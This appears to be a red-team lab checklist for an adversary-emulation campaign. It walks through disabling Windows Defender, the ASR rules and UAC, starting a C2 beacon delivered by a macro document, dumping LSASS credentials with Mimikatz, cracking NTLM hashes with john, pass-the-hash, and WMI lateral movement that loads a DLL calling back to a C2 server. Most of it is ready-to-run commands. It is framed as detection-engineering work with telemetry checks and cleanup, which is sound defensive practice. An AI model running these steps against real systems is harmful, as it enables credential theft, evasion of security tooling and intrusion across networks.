# C0015 — Phase-2 run checklist (S1→S9, one ordered pass)

Executable order for the whole pass: **re-establish session 1 → discovery (beacon) → share artifact → decision →
auth → credential access (real Mimikatz) → WMI lateral → session 2 → verify/cleanup**. One `run_id` threads S1→S9.
This checklist reflects **C2-SIM v3.2** + the operator orchestrator `payloads/packaging/run_campaign_orchestrator.ps1`
(`-Action Pre|WaitSession|P1|P2|Cmd|Run|Results|Artifacts|Stop`) — the old `stage/ws01/c2-console-phase2.ps1` /
`run-phase2.ps1` names are gone. Swap `RUN-20260928-02` for your real run_id.

## 0. Build & preflight (C2 host / Kali + VMs)

```bash
# Kali: build the two DLLs/EXE (mingw) + grab real Mimikatz
./payloads/packaging/build_dll.sh                                   # -> build/out/c0015-comparefor.jpg
x86_64-w64-mingw32-gcc -shared -o c0015_143_surrogate.dll payloads/dll/c0015_143_surrogate.c -luser32 -lshlwapi
git clone https://github.com/ParrotSec/mimikatz                    # use x64/mimikatz.exe (verify hash); copy to staging
```
```powershell
# C2 host: stage the phase-2 payloads next to build/out
New-Item -Force -ItemType Directory stage/ws01
Copy-Item c0015_143_surrogate.dll stage\ws01\
Copy-Item mimikatz.exe stage\ws01\
```
Preflight gates (all REQUIRED this pass; run on the machines tagged):
- `it.admin` ∈ local **Administrators on BOTH WS01 and FS01** (`runas /user:C0015\it.admin "cmd /c whoami /groups"` — must
  show `SeDebugPrivilege`); add if missing: `net localgroup Administrators C0015\it.admin /add`.
- WS01: **`EnableLUA=0`** (`reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA
  /t REG_DWORD /d 0 /f`) + **reboot** — otherwise `runas it.admin` gets a filtered token (no SeDebug) and S7b fails.
- **3 machines (C2 host, WS01, FS01):** Tamper Protection OFF, then:
  `Set-MpPreference -AttackSurfaceReductionRules_Ids "d1e49aac-8f56-4280-b9aa-9936ba642ffc" -AttackSurfaceReductionRules_Actions Disabled`
  (ASR rule *"Block process creations originating from PSExec and WMI commands"* — it blocks the WMI pivot),
  `Set-MpPreference -DisableRealtimeMonitoring $true`,
  `Add-MpPreference -ExclusionProcess pwsh.exe,powershell.exe,cmd.exe,wmic.exe,rundll32.exe,mimikatz.exe`,
  `Add-MpPreference -ExclusionPath C:\C0015,C:\stage,C:\Tools,C:\Users\Public\C0015,C:\ProgramData\C0015,E:\lab`.
- FS01 only: **allow inbound WMI** — `Set-NetFirewallRule -DisplayGroup "Windows Management Instrumentation (WMI)"
  -Enabled True` (TCP 135 + RPC dynamic) or disable the firewall in the lab.
- Sysmon BALANCED loaded; audit (4624/4625/4648/4672/4688).

## 1. Start C2-SIM v3.2 + HTTP server (C2 host) — or use the orchestrator

```powershell
pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -RunId RUN-20260928-02 -Action Pre
# Pre = make_config + stage copies + launch servers + Wait-Listeners (both :8080/:8000 up before returning)
# manual equivalent: pwsh -File payloads/packaging/launch_servers.ps1 -C2Ip 192.168.50.1 -PublishDir build/out
# verify: c2sim.log first line = "C2-SIM v3 listening ..." ; http://192.168.50.1:8000/c0015-comparefor.jpg -> 200
```

## 2. Generate configs (C2 host; fill real run_id)

```powershell
pwsh -File payloads/packaging/make_config.ps1 -RunId RUN-20260928-02 -C2Host 192.168.50.1 -OutPath stage/ws01/config.ini
# make_config now emits loop_count=0 (beacon runs forever — no mid-run death) and token_file=<Public>\token.txt
Copy-Item payloads/hta/bootstrap.hta    stage\ws01\
Copy-Item payloads/beacon/c0015_beacon.ps1 stage\ws01\
# phase7 config (session 2) — copy the example, set the SAME run_id
Copy-Item payloads/config/c0015-phase7.example.ini stage\ws01\config-phase7.ini   # edit run_id inside
```

## 2b. IT logon seed (S0) — "an admin logged into WS01 in the past" (WS01)

**Why:** lsass keeps only the logon sessions ALIVE at dump time. To let the later mimikatz dump genuinely find
`it.admin` (no assumption we "know" the password), a real it.admin session must exist on WS01 and stay alive
until S7b. This is the **[LAB-SEED]** the attack narrative assumes ("IT logged on before the operation");
real sessions -> real `sekurlsa` output.

WS01 (operator playing IT; **keep the window OPEN** until after S7b, Ctrl+C at cleanup):
```powershell
# keep-alive runas session (type-8 logon); password at prompt
runas /user:C0015\it.admin "cmd /c ping -t 127.0.0.1"
```
Alternatives: leave an RDP/interactive console logged in as it.admin, or a scheduled task running as it.admin.
Verify the seed (Elastic WS01): **S4648** (explicit credential) + **E1 cmd.exe (parent = runas)**; session PID alive.

## 3. Re-establish session 1 (WS01, duc.user)

```powershell
powershell -ExecutionPolicy Bypass -File .\stage_ws01.ps1 -Source C:\stage        # config.ini + hta + beacon -> C:\Users\Public\C0015\
powershell -ExecutionPolicy Bypass -File .\install_macro_docm.ps1 -MacroSource .\macro_payload.vba
# open test.docm ONCE (Enable Content)
```
Verify: `c2sim.log` → `register stage=phase3 host=WS01 token=… ok=True (registered)` (ONE line, dedup otherwise);
markers `b64-marker.txt`, `js-marker.txt`, `c0015-comparefor.jpg`, `dll-executed.txt`.

## 4. Get the session token (operator console)

```powershell
# orchestrator (recommended): waits until session 1 appears and prints the token
pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -RunId RUN-20260928-02 -Action WaitSession
# manual:
$tok = (Invoke-RestMethod "http://192.168.50.1:8080/sessions" | Where-Object stage -eq "phase3").token
$tok   # S1-<16hex> — used for /cmd and /runbook below
```

## 5. Discovery — play the kill-chain runbook (C2 host; beacon runs on WS01)

```powershell
pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -RunId RUN-20260928-02 -Action P2
# P2 = enqueue runbook scripts/runbooks/c0015-phase2.json (11 entries) + wait for drain + artifact templates
# manual:
Invoke-RestMethod -Method Post -Uri "http://192.168.50.1:8080/runbook?session=$tok&name=c0015-phase2"
Get-Content c2sim.log -Tail 30      # watch 11x task=OP-CMD ... result ... ok=True (accepted)
```
Optional micro-manage: `pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -Action Run -Body "net view /all"`
(posts `/cmd` + reads the output back via `/last`); dump all stored outputs with `-Action Results`.
Verify (Elastic): E1 children of the beacon powershell; each `process.command_line` matches the tasked command.
Collect evidence: `powershell -ExecutionPolicy Bypass -File .\collect_ws01_evidence.ps1 -SinceMinutes 30 -OutPath C:\Users\Public\c0015-evidence.json`

## 6. S5 — share probe & artifact (BEACON-RUN from the C2 host; WS01 executes, like a real operator)

The runbook already tasks `net view \\FS01` (entry 10) and the ShareFinder write (entry 11) — if you played it in
step 5, `C:\ProgramData\found_shares.txt` already exists on WS01. Otherwise task them now (remote, from C2):
```powershell
pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -Action Run -Body 'net view \\FS01'
pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -Action Run -Body 'powershell -NoProfile -Command "Get-SmbShare | Out-File C:\ProgramData\found_shares.txt"'
pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -Action Results   # read the outputs (Finance/IT on \FS01)
```
Verify (Elastic WS01): E1 with **parent = beacon powershell** (net.exe / powershell child) + E11
`found_shares.txt` → DIRECT EVENT LINK. (Interactive fallback only if the beacon is unavailable — that drops the
link tier to SUPPORTED.)
```powershell
# C2 host
python scripts/lab_tools.py artifact-new ART-04-01 RUN-20260928-02 5 6 --payload stage/ws01/found_shares.json -o stage/ws01/art04_01.json
```

## 7. S6 — decision (C2 host)
```powershell
python scripts/lab_tools.py artifact-new ART-04-02 RUN-20260928-02 6 8 --payload stage/ws01/target-manifest.json -o stage/ws01/art04_02.json
# selection_reason must be derived from ART-04-01 content (target = FS01)
```

## 8. S7 — auth controls (WS01; password at prompt only)

**Why:** validate WHICH identity may reach FS01 before the WMI pivot, and (key) plant the
it.admin logon SESSION on WS01 so S7b's lsass dump can find it. A `net use IPC$` logon proves share/logon
rights but does NOT change the WS01 process token — the identity for S8 is re-supplied explicitly by runas.

```powershell
net use \\FS01\IPC$ /user:C0015\duc.user *      # A. denied  (S4625)
net use \\FS01\IPC$ /user:C0015\it.admin *      # B. allowed (S4624 T3 + S4672)  ← plants it.admin on WS01
net use /delete \\FS01\IPC$
net use \\FS01\IPC$ /user:C0015\<revoked> *     # C. denied
net use /delete \\FS01\IPC$
```
`python scripts/lab_tools.py artifact-new ART-05-01 RUN-20260928-02 5 6 --payload stage/ws01/auth-bundle.json -o stage/ws01/art05_01.json`

## 9. S7b — credential access (REAL LSASS dump → obtain → crack; WS01 + Kali)

```powershell
# 1) REAL dump runs INTERACTIVELY (full token after EnableLUA=0; watch the NEW console)
Copy-Item stage\ws01\mimikatz.exe \\WS01\C$\Tools\mimikatz.exe
runas /user:C0015\it.admin "cmd /k C:\Tools\mimikatz.exe"
# in the mimikatz console:  privilege::debug  ->  sekurlsa::logonpasswords
```
2) In the console output, copy it.admin's line — it carries the **NTLM hash** (no plaintext on modern Windows).
3) Crack it on KALI (transient file, delete after use) — **john** (Kali has no OpenCL for hashcat):
```bash
echo -n '<NTLM_HASH>' > /tmp/itadmin.ntlm
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt /tmp/itadmin.ntlm
john --format=nt --show /tmp/itadmin.ntlm     # if rockyou misses -> use the provisioned plaintext
rm -f /tmp/itadmin.ntlm
```
4) Use the **cracked/provisioned plaintext** at any subsequent prompt — the pivot credential genuinely comes from
   the exercise (in-run only; never in repo/logs/ledger).
> NOTE: mimikatz through the beacon (`/cmd`) HANGS (real mimikatz is a REPL that reads stdin; `cmd /c` is
> non-interactive) — the dump must run in the elevated console.
Alternative (no crack): Pass-the-Hash on WS01 → `sekurlsa::pth /user:it.admin /domain:c0015.lab /ntlm:<hash>
"cmd /c wmic /node:FS01 process call create ..."` (telemetry differs: no S4648; FS01 4624 from the forged logon).
Verify (Elastic): WS01 S4648 (runas) + E1 mimikatz.exe (parent cmd) + E10 target lsass.exe; no mimikatz line in
`c2sim.log`. Guardrail: close the runas windows after use; values live in operator memory only.

## 10. S8 — lateral (WS01 → FS01)

```powershell
# S8a handoff (T1570): 143.dll + beacon + phase7 config to FS01
copy stage\ws01\c0015_143_surrogate.dll \\FS01\C$\C0015\
copy payloads\beacon\c0015_beacon.ps1         \\FS01\C$\C0015\
copy stage\ws01\config-phase7.ini             \\FS01\C$\C0015\config-phase7.ini
```
S8b — **WMI remote process creation (T1047)**. Direct `rundll32.exe C:\C0015\c0015_143_surrogate.dll,LabEntry`
via WMI returns **ReturnValue=9 "Path not found"** for ANY DLL (rundll32 is GUI subsystem and cannot init a
window station in WMI's non-interactive session-0; proven with `user32.dll,MessageBeep`; `rundll32.exe` alone
returns 0). Keep the WMI pivot but load the **SAME 143.dll** through a console-loader host:
```powershell
# stage the loader ON FS01 (loads c0015_143_surrogate.dll and calls LabEntry):
#   C:\C0015\s8b_loader.ps1  =  P/Invoke kernel32 LoadLibrary/GetProcAddress -> LabEntry
# then from the elevated WS01 console:
runas /user:C0015\it.admin "cmd /k wmic /node:FS01 process call create \"cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -File C:\C0015\s8b_loader.ps1\""
# -> ReturnValue=0, ProcessId=<pid>  (run RUN-20260930-01: ProcessId=964)
```
`python scripts/lab_tools.py artifact-new ART-06-01 RUN-20260928-02 6 7 --payload stage/ws01/remote-process.json -o stage/ws01/art06_01.json`
Gate (4): FS01 process created via WMI / identity (S4648 + FS01 S4624/4672 same FS01 LogonId) / DLL hash / callback S9.

## 11. S9 — session 2 (automatic after S8b)

```powershell
Get-ChildItem evidence/run-ledger | Sort-Object LastWriteTime | Select-Object -Last 5   # ART-07-01-<token8>.json
Get-Content c2sim.log -Tail 10                                                          # register phase7-session2 ok=True + T-DISCOVER-CORPUS result
```
Verify (Elastic FS01): E1 `cmd/powershell` (console-loader, parent `wmiprvse.exe`), **E7** `C:\C0015\c0015_143_surrogate.dll`
(hash = ART-06-01; loaded by the loader host, NOT rundll32), E11 `c0015_143-executed.txt`, E3 → `192.168.50.1:8080`.
Acceptance: **server-side ART-07-01 receipt + callback telemetry in the same run** — marker alone is NOT enough.

## 12. Verify & cleanup

- Run the per-stage skeletons from `docs/phase2-detection-prep-s4-s9.md`; reconcile joins per §8b map of the
  playbook (ProcessGuid same-host; FS01 4624↔4672 by FS01 LogonId; never 4648↔4624 by LogonId).
- Record ledger rows S1–S9 under the one run_id (statuses in allowed vocabulary).
```powershell
pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -Action Stop   # stop C2-SIM + HTTP
Remove-Item -Recurse -Force C:\Users\Public\C0015, "$env:USERPROFILE\Desktop\test.docm"   # WS01
Remove-Item -Recurse -Force C:\C0015, C:\Tools\mimikatz.exe                                # FS01/WS01
# Re-enable Defender + ASR rule + restore routine Sysmon profile + re-enable WMI firewall block.
```